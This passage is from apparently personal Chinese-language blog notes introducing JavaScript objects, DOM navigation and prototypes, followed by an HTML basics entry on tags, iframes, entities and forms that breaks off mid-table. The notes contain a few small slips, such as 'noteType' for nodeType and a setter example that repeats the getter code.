class="string">&quot;1&quot;</span>&gt;</span>      <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;2&quot;</span>&gt;</span>        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;3&quot;</span>&gt;</span>          <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;4&quot;</span>&gt;</span>            HELLO          <span class="tag">&lt;/<span class="name">p</span>&gt;</span>          <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;5&quot;</span>&gt;</span>          <span class="tag">&lt;/<span class="name">p</span>&gt;</span>        <span class="tag">&lt;/<span class="name">div</span>&gt;</span>      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>    <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">    <span class="keyword">var</span> father = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;4&#x27;</span>);</span><span class="language-javascript">    <span class="keyword">var</span> child = father.<span class="property">firstChild</span>.<span class="property">textContent</span>;</span><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;5&#x27;</span>).<span class="property">innerHTML</span> = child;</span><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre><p>将目标作为自己的父节点，可以获取自身文本内容。</p><p>附：nodeName是element的一个只读属性，返回当前节点作为字符串的名称。</p><h5 id="访问父节点"><a href="#访问父节点" class="headerlink" title="访问父节点"></a>访问父节点</h5><p>语法：element.parentElement</p><h5 id="访问兄弟节点"><a href="#访问兄弟节点" class="headerlink" title="访问兄弟节点"></a>访问兄弟节点</h5><p>使用<strong>previousSibling</strong>和<strong>nextSibling</strong>属性来访问DOM树中的上一个和下一个节点。</p><h5 id="DOM根节点"><a href="#DOM根节点" class="headerlink" title="DOM根节点"></a>DOM根节点</h5><p>以下两个属性允许访问整个文档：</p><ul><li>document.body(head)</li><li>document.documentElement</li></ul><p>附：document.documentElement的功能更强大，可以显示<html>标签里的所有内容。</p><h5 id="noteType属性"><a href="#noteType属性" class="headerlink" title="noteType属性"></a>noteType属性</h5><p>该属性以数字形式返回指定节点的节点类型</p><p>语法：element.noteType</p><p>下表列出了最重要的节点类型：</p><table><thead><tr><th>ELEMENT_NODE</th><th>1</th><th><p class="heading">Hello, World</p></th></tr></thead><tbody><tr><td>ATTRIBUTE_NODE</td><td>2</td><td>class &#x3D;“heading”（不建议使用）</td></tr><tr><td>TEXT_NODE</td><td>3</td><td>Hello, World</td></tr><tr><td>COMMENT_NODE</td><td>8</td><td>&lt;！–这是注释–&gt;</td></tr><tr><td>DOCUMENT_NODE</td><td>9</td><td>HTML文档本身（<html>的父级）</td></tr><tr><td>DOCUMENT_TYPE_NODE</td><td>10</td><td>&lt;！doctype html&gt;</td></tr></tbody></table><h2 id="JavaScript对象-1"><a href="#JavaScript对象-1" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="概述：-2"><a href="#概述：-2" class="headerlink" title="概述："></a>概述：</h4><blockquote><p>对象是由<strong>属性</strong>和<strong>方法</strong>的集合组成的数据类型。</p></blockquote><blockquote><p>在JavaScript中，基本上所有东西都是对象：</p><ul><li>字符串可以是对象（如果使用new关键字定义）</li><li>数字可以是对象（如果使用new关键字定义）</li><li>布尔值可以是对象（如果使用new关键字定义）</li><li>日期始终是对象</li><li>数学永远是对象</li><li>数组始终是对象</li><li>正则表达式始终是对象</li><li>函数永远是对象</li><li>Object就是对象</li></ul><p>除原语外，所有JavaScript值都是对象。</p></blockquote><p>附：在Java编程语言中，原语（primitive）指的是一组基本的数据类型，它们不是对象，也不具有方法。</p><h4 id="JavaScript基元"><a href="#JavaScript基元" class="headerlink" title="JavaScript基元"></a>JavaScript基元</h4><p>原始值是没有属性或方法的值。</p><p>在JavaScript中，有5种原始类型：</p><ul><li>string</li><li>number</li><li>boolean</li><li>null</li><li>undefined</li></ul><h3 id="创建JavaScript对象"><a href="#创建JavaScript对象" class="headerlink" title="创建JavaScript对象"></a>创建JavaScript对象</h3><p>终于详细讨论这个问题了。</p><blockquote><p>有多种创建新对象的方法：</p><ul><li>使用<strong>对象常量</strong>，它使用大括号：{}</li><li>使用<strong>对象构造函数</strong>，它使用new Object()</li><li>可以创建一个<strong>构造函数</strong>  ，然后示例化一个调用该函数的对象</li></ul></blockquote><h4 id="使用对象常量"><a href="#使用对象常量" class="headerlink" title="使用对象常量"></a>使用对象常量</h4><p>例子：</p><pre><code class="highlight plaintext">var Pq = &#123;name: &#x27;pq&#x27;, age:20&#125;;</code></pre><p>附：对象定义可以跨越多行。</p><h4 id="使用new-Object"><a href="#使用new-Object" class="headerlink" title="使用new Object()"></a>使用<strong>new Object()</strong></h4><p>例子（哈哈哈，我简化了）：</p><pre><code class="highlight plaintext">var user = &#123;&#125;;user.name = &#x27;pq&#x27;;user.age = 20;</code></pre><h4 id="使用构造函数"><a href="#使用构造函数" class="headerlink" title="使用构造函数"></a>使用构造函数</h4><p>例子：</p><pre><code class="highlight plaintext">function Man(name, age) &#123;    this.name = name;    this.age = age;&#125;var Pq = new Man(&#x27;pq&#x27;, 20);</code></pre><h4 id="JavaScript对象是可变的"><a href="#JavaScript对象是可变的" class="headerlink" title="JavaScript对象是可变的"></a>JavaScript对象是可变的</h4><blockquote><p>可变是一种可以更改的变量。在JavaScript中，只有对象和数组是可变的，不是原始值。</p><p><strong>可变对象</strong>是一种对象，其状态在创建后即可修改。</p><p><strong>不可变</strong>对象是一旦创建对象便无法更改其状态的对象。</p></blockquote><p><strong>字符串</strong>和<strong>数字</strong>是<strong>不可变的</strong>，改值后地址变了。</p><p>对象是可变的：它们是通过引用而不是值来寻址的。</p><blockquote><p>如果user是对象，则以下语句将不会创建该用户的副本：</p><pre><code class="highlight plaintext">var x = user;  // 这不会创建user副本.</code></pre><p>对象x不是user的副本，它是user。x和user是同一个对象。</p><p>对x的任何更改也将更改user，因为x和user是相同的对象。</p></blockquote><h4 id="比较对象"><a href="#比较对象" class="headerlink" title="比较对象"></a>比较对象</h4><p>在JavaScript中，对象是引用类型。即使两个不同的对象具有相同的属性，它们也永远不会相等。</p><p>仅将<strong>同一对象</strong>引用与其自身进行比较会得出<strong>true</strong>。</p><h3 id="JavaScript-对象属性"><a href="#JavaScript-对象属性" class="headerlink" title="JavaScript 对象属性"></a>JavaScript 对象属性</h3><blockquote><p><strong>属性</strong>是对象内的名称（键）和值之间的关联，并且它可以包含任何数据类型。</p><p><strong>属性</strong>通常是指一个对象的特征。</p><p>通常可以更改，添加和删除属性，但某些属性是只读的。</p></blockquote><h4 id="访问JavaScript属性"><a href="#访问JavaScript属性" class="headerlink" title="访问JavaScript属性"></a>访问JavaScript属性</h4><p>有两种访问对象属性的方法：</p><ul><li>点表示法： .</li><li>括号符号： []</li></ul><h4 id="添加新，修改旧属性"><a href="#添加新，修改旧属性" class="headerlink" title="添加新，修改旧属性"></a>添加新，修改旧属性</h4><p>直接使用等于号，</p><p>注意：避免对属性或方法名称使用保留字。</p><h4 id="删除对象属性"><a href="#删除对象属性" class="headerlink" title="删除对象属性"></a>删除对象属性</h4><p>语法：delete element.property</p><h4 id="遍历对象属性"><a href="#遍历对象属性" class="headerlink" title="遍历对象属性"></a>遍历对象属性</h4><p>JavaScript具有<strong>for…in</strong>专门用于迭代对象属性的循环。</p><p>语法：</p><pre><code class="highlight plaintext">for (variable in object) &#123; statement to be executed&#125;</code></pre><p>例子：</p><pre><code class="highlight plaintext">var user = &#123;firstName:&quot;Seagull&quot;, lastName:&quot;Anna&quot;, age:22, location:&quot;New Delhi&quot;&#125;;for (let x in user) &#123;    document.write(x);&#125;</code></pre><p>附：<a href="https://www.cainiaojc.com/jsref/for_in.html">for…in</a>循环不应与<a href="https://www.cainiaojc.com/jsref/for_of.html">for…of</a>循环混淆，后者仅在Array对象类型上使用。</p><p>另一个有用的枚举方法是Object.keys()方法，该方法将返回对象属性的数组。</p><p>语法：object.keys(对象)</p><blockquote><p>此方法使我们可以将对象的属性作为数组使用，因此您可以利用JavaScript数组的所有方法。</p></blockquote><p>附：属性的内部属性</p><blockquote><p>所有属性都有一个名称。另外它们也有属性值。</p><p>该值是属性的属性之一。</p><p>其他属性是：可枚举，可配置和可写。</p><p>这些属性定义了属性的访问方式（可读性，可写性）。</p><p>在JavaScript中，可以读取所有属性，但是只能更改属性值（并且仅在该属性为可写状态时）。</p></blockquote><h3 id="JavaScript-对象方法"><a href="#JavaScript-对象方法" class="headerlink" title="JavaScript 对象方法"></a>JavaScript 对象方法</h3><h4 id="概述：-3"><a href="#概述：-3" class="headerlink" title="概述："></a>概述：</h4><blockquote><p><strong>方法</strong>是与对象，或者说相关联的函数，一种方法是一个对象，它是函数的一个属性。</p><p>方法的定义方式与常规函数的定义方式相同，不同之处在于必须将它们分配为对象的属性。</p></blockquote><h4 id="使用this作为对象引用"><a href="#使用this作为对象引用" class="headerlink" title="使用this作为对象引用"></a>使用this作为对象引用</h4><blockquote><p>JavaScript有一个特殊的关键字this，您可以在方法中使用它来引用当前对象。</p></blockquote><p>如下：</p><pre><code class="highlight plaintext">getName: function() &#123; return this.firstName + &quot; &quot; + this.lastName;&#125;</code></pre><blockquote><p>this关键字是指代码被写入内部当前对象-所以在这种情况下，this等同于<strong>user</strong>。</p><p>换句话说，this.firstName表示<strong>此对象</strong>的firstName属性。</p></blockquote><h4 id="添加新方法"><a href="#添加新方法" class="headerlink" title="添加新方法"></a>添加新方法</h4><p>直接等于号，如下：</p><pre><code class="highlight plaintext">user.greet = function() &#123;    return &quot;Hello World&quot;;&#125;;document.getElementById(&quot;para&quot;).innerHTML = user.greet();</code></pre><h4 id="Getters和Setters"><a href="#Getters和Setters" class="headerlink" title="Getters和Setters"></a>Getters和Setters</h4><p>getter是一种获取特定属性值的方法。</p><p>setter是一种设置特定属性值的方法。</p><p>例子：get关键字</p><pre><code class="highlight plaintext">//创建一个对象var user = &#123;  firstName: &quot;Seagull&quot;,  lastName : &quot;Anna&quot;,  age  : 22,  location : &quot;New Delhi&quot;,  get loc() &#123;     return this.location;  &#125;&#125;;//显示来自对象的数据document.getElementById(&quot;para&quot;).innerHTML = user.loc;</code></pre><p>还有：set关键字</p><pre><code class="highlight plaintext">//创建一个对象var user = &#123;  firstName: &quot;Seagull&quot;,  lastName : &quot;Anna&quot;,  age  : 22,  location : &quot;New Delhi&quot;,  get loc() &#123;     return this.location;  &#125;&#125;;//显示来自对象的数据document.getElementById(&quot;para&quot;).innerHTML = user.loc;</code></pre><h4 id="Object-defineProperty"><a href="#Object-defineProperty" class="headerlink" title="Object.defineProperty()"></a>Object.defineProperty()</h4><p>Object.defineProperty()方法还可以用于添加Getter和Setter。</p><p>语法：</p><pre><code class="highlight plaintext">Object.defineProperty(object, property, &#123;value : value&#125;)</code></pre><h3 id="JavaScript-对象构造函数"><a href="#JavaScript-对象构造函数" class="headerlink" title="JavaScript 对象构造函数"></a>JavaScript 对象构造函数</h3><p>JavaScript 内置构造函数：</p><pre><code class="highlight plaintext">let x1 = new String(); //一个新的String对象。let x2 = new Number(); //一个新的number对象。let x3 = new Boolean(); //一个新的布尔对象。let x4 = new Object(); //一个新Object对象。let x5 = new Array(); //一个新的Array对象。let x6 = new RegExp(); //一个新的RegExp对象。let x7 = new Date(); //一个新的date对象。let x8 = new Function(); //一个新函数对象。</code></pre><h4 id="不要将Number、String或Boolean声明为对象"><a href="#不要将Number、String或Boolean声明为对象" class="headerlink" title="不要将Number、String或Boolean声明为对象"></a>不要将Number、String或Boolean声明为对象</h4><blockquote><p>终将数字，字符串或布尔值视为原始值。不作为对象。</p><p>将这些类型声明为对象会降低执行速度，并产生意外结果。</p></blockquote><p>也可以这样做：</p><ul><li>使用{}代替new Object()</li><li>使用””代替new String()</li><li>使用0代替new Number()</li><li>使用false代替new Boolean()</li><li>使用[]代替new Array()</li><li>使用&#x2F;()&#x2F;代替new RegExp()</li><li>使用function (){}代替new Function()</li></ul><h3 id="JavaScript-对象原型及原型链"><a href="#JavaScript-对象原型及原型链" class="headerlink" title="JavaScript 对象原型及原型链"></a>JavaScript 对象原型及原型链</h3><h4 id="原型"><a href="#原型" class="headerlink" title="原型"></a>原型</h4><blockquote><p><strong>原型</strong>是一种机制，JavaScript对象通过该机制彼此继承特征。</p></blockquote><p>prototype属性可以向构造函数添加属性和方法。</p><p>语法：object.property.name &#x3D; value</p><h4 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h4><p>部分内容摘自：<a href="https://juejin.cn/post/6984678359275929637">一文搞懂JS原型与原型链（超详细，建议收藏） - 掘金 (juejin.cn)</a></p><h5 id="原型对象"><a href="#原型对象" class="headerlink" title="原型对象"></a>原型对象</h5><blockquote><p>JS的每个函数在创建的时候，都会生成一个属性<code>prototype</code>，这个属性指向一个对象，这个对象就是此函数的<code>原型对象</code>。该<code>原型对象</code>中有个属性为<code>constructor</code>，指向该函数。这样<code>原型对象</code>和<code>它的函数</code>之间就产生了联系。</p></blockquote><h5 id="JS原型链"><a href="#JS原型链" class="headerlink" title="JS原型链"></a>JS原型链</h5><p>每个通过<code>构造函数</code>创建出来的<code>实例对象</code>，其本身有个属性<code>__proto__</code>，这个属性会指向该<code>实例对象</code>的<code>构造函数</code>的<code>原型对象</code>。</p><p><img src="/./../../../web%E5%AE%89%E5%85%A8/WEB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E7%9F%A5%E8%AF%86%E7%AF%87/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1141452b532f4e9cab03ba48f58beadetplv-k3u1fbpfcp-zoom-in-crop-mark1512000.webp" alt="image.png"></p><blockquote><p>当访问一个<code>对象</code>的某个属性时，会先在这个对象本身属性上查找，如果没有找到，则会通过它的<code>__proto__</code>隐式属性，找到它的<code>构造函数</code>的<code>原型对象</code>，如果还没有找到就会再在其<code>构造函数</code>的<code>prototype</code>的<code>__proto__</code>中查找，这样一层一层向上查找就会形成一个链式结构，我们称为<code>原型链</code>。</p></blockquote><blockquote><p><strong>注意点</strong>：如果通过<code>p1实例对象</code>的<code>__proto__</code>属性赋值，则会改变其<code>构造函数</code>的<code>原型对象</code>，从而被所有实例所共享。</p></blockquote><p>原型链的尽头是NULL。</p><p>神评：</p><blockquote><p>每个构造函数：例如Array都有自己的原型对象 Prototype, 而 Array每次new 出来的实例对象 array &#x3D; new Array() 如果想找到 原型对象 Prototype上面的属性的话，得通过 <strong>proto</strong> 来找到（也就是 arrar.<strong>proto</strong> &#x3D;&#x3D;&#x3D; Array.Prototype）; 但是Array的原型对象 Prototype的上层其实还有 <strong>proto</strong>, 而它的__proto__指向的就是 Object.Prototype ; 也就是Array.Prototype._<em>proto</em></p></blockquote><p>自我总结：每个构造函数抽象出一个原型对象以承载公共属性和方法，原型链使对象与构造函数的原型对象建立link。</p><h3 id="JavaScript-类"><a href="#JavaScript-类" class="headerlink" title="JavaScript 类"></a>JavaScript 类</h3><h4 id="概述：-4"><a href="#概述：-4" class="headerlink" title="概述："></a>概述：</h4><p><strong>类是用于创建对象的模板。</strong></p><p>创建一个类并实例化的语法格式如下</p><pre><code class="highlight plaintext">class Runoob &#123;    constructor(name, url) &#123;        this.name = name;        this.url = url;    &#125;&#125;let site = new Runoob(&quot;菜鸟教程&quot;,  &quot;https://www.runoob.com&quot;);</code></pre><h4 id="类继承"><a href="#类继承" class="headerlink" title="类继承"></a>类继承</h4><blockquote><p><strong>super()</strong> 方法引用父类的构造方法。</p><p>通过在构造方法中调用 <strong>super()</strong> 方法，我们调用了父类的构造方法，这样就可以访问父类的属性和方法。</p></blockquote><p>语法： super(father方法);</p><p>还可以使用原型链。</p><h4 id="JavaScript-静态方法"><a href="#JavaScript-静态方法" class="headerlink" title="JavaScript 静态方法"></a>JavaScript 静态方法</h4><blockquote><p>静态方法是使用 static 关键字修饰的方法，又叫类方法，属于类的，但不属于对象，在实例化对象之前可以通过 <strong>类名.方法名</strong> 调用静态方法。</p><p>静态方法不能在对象上调用，只能在类中调用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML入门</title>
      <link href="/2024/03/18/HTML%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/HTML%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="HTML入门"><a href="#HTML入门" class="headerlink" title="HTML入门"></a>HTML入门</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul><li>HTML全称：<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage，是一种标记语言。</li><li>HTML文档也叫做 web 页面。</li><li>HTML文档由HTML标签嵌套和相关文本等组成，每种标签内还有对应的属性。</li><li>HTML元素是一个完整的标签和内容：一个 HTML 元素包含了开始标签与结束标签。</li><li>Web 浏览器：Web浏览器（如谷歌浏览器，Internet Explorer，Firefox，Safari）是用于读取HTML文件，并将其作为网页显示。浏览器并不是直接显示的HTML标签，但可以使用标签来决定如何展现HTML页面的内容给用户。</li><li>中文编码：目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。example：<meta charset="UTF-8"></li></ul><h2 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h2><ul><li>HTML 元素以<strong>开始标签</strong>起始</li><li>HTML 元素以<strong>结束标签</strong>终止</li><li><strong>元素的内容</strong>是开始标签与结束标签之间的内容</li><li>某些 HTML 元素具有<strong>空内容（empty content）</strong></li><li>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束）</li><li>大多数 HTML 元素可拥有属性</li></ul><p>另外，HTML 文档由嵌套的 HTML 元素构成。</p><h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><ul><li>HTML 元素可以设置<strong>属性</strong></li><li>属性可以在元素中添加<strong>附加信息</strong></li><li>属性一般描述于<strong>开始标签</strong></li><li>属性总是以名称&#x2F;值对的形式出现，<strong>比如：name&#x3D;”value”</strong></li></ul><p>另外，属性值不强制单或双引号，但是在必要时候需要<strong>双</strong>里用<strong>单</strong></p><p>他人笔记：</p><ol><li>属性和属性值，尽量小写，本来这样做也方便些。</li><li>class 属性可以多用 <strong>class&#x3D;” “</strong> （引号里面可以填入多个class属性）</li><li>id 属性只能单独设置 **id&#x3D;” “**（只能填写一个，多个无效）</li></ol><h2 id="HTML文本格式化"><a href="#HTML文本格式化" class="headerlink" title="HTML文本格式化"></a>HTML文本格式化</h2><p><a href="http://www.it028.com/html-formatting.html">HTML 文本格式化 | 菜鸟教程 (it028.com)</a>。嘿嘿，没啥好说的</p><h2 id="HTML链接"><a href="#HTML链接" class="headerlink" title="HTML链接"></a>HTML链接</h2><p>HTML使用标签 <a>来设置超文本链接。</p><ol><li>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</li><li>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</li><li>在标签<a> 中使用了href属性来描述链接的地址。</li><li>默认情况下，链接将以以下形式出现在浏览器中：</li></ol><ul><li><p>一个未访问过的链接显示为蓝色字体并带有下划线。</p></li><li><p>访问过的链接显示为紫色并带有下划线。</p></li><li><p>点击链接时，链接显示为红色并带有下划线。</p></li></ul><p>语法：<a href='url'>TEXT</a></p><p>对应属性：target</p><h2 id="head"><a href="#head" class="headerlink" title="&lt; head &gt;"></a>&lt; head &gt;</h2><p>内部元素：</p><p>Ⅰ. <title>标签：</p><p>1.<title> 在 HTML&#x2F;XHTML 文档中是必须的。</p><p>2.<title> 元素:</p><ul><li>定义了浏览器工具栏的标题</li><li>当网页添加到收藏夹时，显示在收藏夹中的标题</li><li>显示在搜索引擎结果页面的标题</li></ul><p>Ⅱ.<base>标签：</p><p>base&gt; 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接。</p><p>Ⅲ. <link>标签：</p><link> 标签定义了文档与外部资源之间的关系。<link> 标签通常用于链接到样式表。<p>Ⅳ. <style>标签：</p><style> 标签定义了HTML文档的样式文件引用地址.在<style> 元素中你也可以直接添加样式来渲染 HTML 文档:Ⅴ. < meta> 标签：meta标签描述了一些基本的元数据。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。Ⅵ. <script>标签：< script >标签用于加载脚本文件，如： JavaScript。上述详解：[HTML 头部 | 菜鸟教程 (it028.com)](http://www.it028.com/html-head.html)## 图像标签< img />属性：src = "url" ; alt="无法加载图片时的文本"< map >标签：[W3School TIY Editor](http://www.w3school.com.cn/tiy/t.asp?f=tags_areamap_1)## 表格标签定义：< table >  < /table >< th >表头；< tr >表的一行；< td >表格单元；## 列表标签### 无序列表：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">ul</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></code></pre>### 有序列表：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">ol</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></code></pre>### 定义列表：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">dl</span>&gt;</span><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">dt</span>&gt;</span><span class="tag">&lt;<span class="name">dd</span>&gt;</span>Black hot drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">dt</span>&gt;</span><span class="tag">&lt;<span class="name">dd</span>&gt;</span>White cold drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></code></pre>自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 <dl> 标签开始。每个自定义列表项以 <dt> 开始。每个自定义列表项的定义以 <dd> 开始。## < div >< span >块级元素：块级元素在浏览器显示时，通常会以新行来开始（和结束）。例子：<h1>, <p>, <ul>, <table>内联元素：内联元素在显示时通常不会以新行开始。例子：<b>, <td>, <a>, <img>< div >：HTML <div> 元素是块级元素，它是可用于组合其他 HTML 元素的容器。<div> 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。如果与 CSS 一同使用，<div> 元素可用于对大的内容块设置样式属性。<div> 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。使用 <table> 元素进行文档布局不是表格的正确用法。<table> 元素的作用是显示表格化的数据。< span >：HTML <span> 元素是内联元素，可用作文本的容器。<span> 元素也没有特定的含义。当与 CSS 一同使用时，<span> 元素可用于为部分文本设置样式属性。附：id属性详解：[HTML id 属性 (w3school.com.cn)](http://www.w3school.com.cn/html/html_id.asp)- `id` 属性用于为 HTML 元素指定唯一的 id（id只能用一次）- `id` 属性的值在 HTML 文档中必须是唯一的- CSS 和 JavaScript 可使用 `id` 属性来选取元素或设置特定元素的样式- `id` 属性的值区分大小写- `id` 属性还可用于创建 HTML 书签- JavaScript 可以使用 `getElementById()` 方法访问拥有特定 id 的元素## HTML内联框架frame 用于在网页内显示网页。语法：<iframe src="URL"></iframe>### 1.Iframe - 设置高度和宽度height 和 width 属性用于规定 iframe 的高度和宽度。属性值的默认单位是像素，但也可以用百分比来设定（比如 "80%"）。实例<pre><code class="highlight html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></code></pre>### 2.Iframe - 删除边框frameborder 属性规定是否显示 iframe 周围的边框，设置属性值为 "0" 就可以移除边框### 3.使用 iframe 作为链接的目标iframe 可用作链接的目标（target），链接的 target 属性必须引用 iframe 的 name 属性：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.w3school.com.cn&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span>W3School.com.cn<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>### 语义元素HTML中的语义元素清楚地向浏览器和开发者描述其意义。<div>和<span>是非语义元素，但是<form>等可以| 标签         | 描述                                               || :----------- | :------------------------------------------------- || <article>    | 定义文章。                                         || <aside>      | 定义页面内容以外的内容。                           || <details>    | 定义用户能够查看或隐藏的额外细节。                 || <figcaption> | 定义 <figure> 元素的标题。                         || <figure>     | 规定自包含内容，比如图示、图表、照片、代码清单等。 || <footer>     | 定义文档或节的页脚。                               || <header>     | 规定文档或节的页眉。                               || <main>       | 规定文档的主内容。                                 || <mark>       | 定义重要的或强调的文本。                           || <nav>        | 定义导航链接。                                     || <section>    | 定义文档中的节。                                   || <summary>    | 定义 <details> 元素的可见标题。                    || <time>       | 定义日期/时间。                                    |### HTML规范1. < !DOCTYPE HTML >书写正确2. 元素及属性值小写3. 关闭每一个元素，即便它是空的4. 属性值加引号5. 类似alt等属性是必备的6. 正确空格和缩进，适当使用空格更加美观（等号两边）7. 避免长代码行8. 尽量使用小写文件名9. 使用正确的文件扩展名：.html(而不是.htm)，.css，.js### HTML字符实体在 HTML 中，某些字符是预留的。在 HTML 中不能使用小于号（<）和大于号（>），这是因为浏览器会误认为它们是标签。如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。空格：&nbsp参考链接：[HTML ISO-8859-1 参考手册 (w3school.com.cn)](http://www.w3school.com.cn/charsets/ref_html_8859.asp)### HTML表情使用UTF-8字符集：<meta charset="UTF-8">example : A = &#65Emoji 字符是来自 UTF-8 字母的字符：- 😄 是 128516- 😍 是 128525- 💗 是 128151😄 == &#128516### HTML框架Frame 标签定义了放置在每个框架中的 HTML 文档。在下面的这个例子中，我们设置了一个两列的框架集。第一列被设置为占据浏览器窗口的 25%。第二列被设置为占据浏览器窗口的 75%。HTML 文档 "frame_a.htm" 被置于第一个列中，而 HTML 文档 "frame_b.htm" 被置于第二个列中：<pre><code class="highlight html"><span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">&quot;25%,75%&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frame_a.htm&quot;</span>&gt;</span>   <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frame_b.htm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></code></pre>假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 <frame> 标签中加入：noresize="noresize"。### HTML背景#### 背景颜色（Bgcolor）背景颜色属性将背景设置为某种颜色。属性值可以是十六进制数、RGB 值或颜色名。<pre><code class="highlight html"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#000000&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;rgb(0,0,0)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;black&quot;</span>&gt;</span></code></pre>#### 背景图片<body background="abc.gif"><body background="https://abc.com/gg.gif">### URL编码在URL中，通常有一组被认为是"不特殊"字符的字符，它们不需要被进行URL编码，可以直接在URL中使用。这包括：1. **字母和数字：** 包括大写和小写字母（A-Z、a-z）以及数字（0-9）。2. **连字符和下划线：** "-"（连字符）和"_"（下划线）。3. **点号：** "."（点号）。4. **波浪线：** "~"（波浪线）。这些字符在URL中被认为是安全的，不会引起混淆或破坏URL结构。其他字符如果在URL中使用，就需要进行URL编码。URL 编码使用 "%" 其后跟随两位的十六进制数来替换非 ASCII 字符。URL 不能包含空格。URL 编码通常使用 + 来替换空格。### HTML表单#### 1.< form >标签< form > ······ < /form >块内写入表单，其属性见下表：| 属性                                                         | 描述                                                         || :----------------------------------------------------------- | :----------------------------------------------------------- || [accept-charset](http://www.w3school.com.cn/tags/att_form_accept-charset.asp) | 规定用于表单提交的字符编码。                                 || [action](http://www.w3school.com.cn/tags/att_form_action.asp) | 规定提交表单时将表单数据发送到何处。                         || 